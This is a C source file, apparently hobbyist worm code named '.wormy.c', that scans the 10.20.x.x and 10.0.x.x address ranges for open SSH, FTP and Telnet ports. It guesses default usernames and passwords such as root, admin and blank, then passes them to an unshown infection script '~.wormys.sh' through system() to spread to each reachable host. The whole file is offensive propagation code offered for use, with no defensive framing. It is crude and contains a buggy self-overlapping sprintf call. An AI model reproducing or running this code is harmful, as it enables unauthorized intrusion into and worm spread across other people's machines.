/*
 * .wormy.c
 * 
 * Copyright 2016 DockTownMayor <DockTownMayor@Host>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA 02110-1301, USA.
 * 
 * 
 */

// This is a lazy code.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

struct serverConnectionFunction{
	int port;
	char address[BUFSIZ];
};

void sub(){
	system("echo \"pop box\">~/boxy.log");
}

int server_Outgoing(void* argument){
	struct serverConnectionFunction *arguments = argument;
	int port = *(int*)&arguments->port;
	char *address = (char*)&arguments->address;
	
	struct sockaddr_in server;
	
	memset((char *) &server, 0, sizeof(server));
	
	server.sin_family = AF_INET;
	inet_pton(AF_INET, address, &server.sin_addr.s_addr);
	server.sin_port = htons(port);
	
	int new_socket;
	
	if ((new_socket = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		return 0;
	
	if (connect(new_socket, (struct sockaddr *) &server, sizeof(server)) < 0)
		return 0;
	
	close(new_socket);
	return 1;
}

int main(int argc, char **argv)
{
	sub(); // Start payload.
	int ij[2] = {10, 20}; // Hosts Segment to infect.
	int c=0;
	int maxWait = 30;
	int maxTryPerSequence = 2;
	char *command = malloc(BUFSIZ);
	int pa[3] = {22, 21, 23};
	char *userlist[3] = {"root", "admin", "administrater"};
	char *passlist[4] = {"root", "password", "", "admin"};
	char *user = malloc(BUFSIZ);
	char *pass = malloc(BUFSIZ);
	char *infectionCode[1] = {"~.wormys.sh"};
	int i, j, p, k;
	pop:
	for (i = 0; i < 254; i++)
	{
		for (j = 0; j < 254; j++)
		{
			for (p = 0; p < sizeof(pa)/sizeof(int); p++)
			{
				memset(command, 0, BUFSIZ*sizeof(char));
				struct serverConnectionFunction argumentsOutgoing;
				argumentsOutgoing.port = pa[p];
				sprintf(command, "%d.%d.%d.%d", ij[0], ij[1], i, j);
				strncpy(argumentsOutgoing.address, command, strlen(command));
				if (server_Outgoing((void *) &argumentsOutgoing)==1){
					for (k =0; k<maxTryPerSequence; k++){
						memset(user, 0, BUFSIZ*sizeof(char));
						memset(pass, 0, BUFSIZ*sizeof(char));
						sprintf(user, "%s", userlist[rand() % 3]);
						sprintf(pass, "%s", passlist[rand() % 4]);
						memset(command, 0, BUFSIZ*sizeof(char));
						if (pa[p]==22) // SSH
							sprintf(command, "%s ssh", infectionCode[0]);
						else if (pa[p]==21)// Ftp
							sprintf(command, "%s ftp", infectionCode[0]);
						else if (pa[p]==23)// Telnet
							sprintf(command, "%s telnet", infectionCode[0]);
						sprintf(command, "%s %s %s %d.%d.%d.%d", command, user, pass, ij[0], ij[1], i, j);
						system(command);
						sleep(rand() % maxWait/2);
					}
				}
				sleep(rand() % maxWait/2);
			}
			sleep(rand() % maxWait);
		}
	}
	if (c==0){
		c++;
		ij[0] = 10;
		ij[1] = 0;
		goto pop;
	}
	free(user);
	free(pass);
	free(command);
	return 0;
}
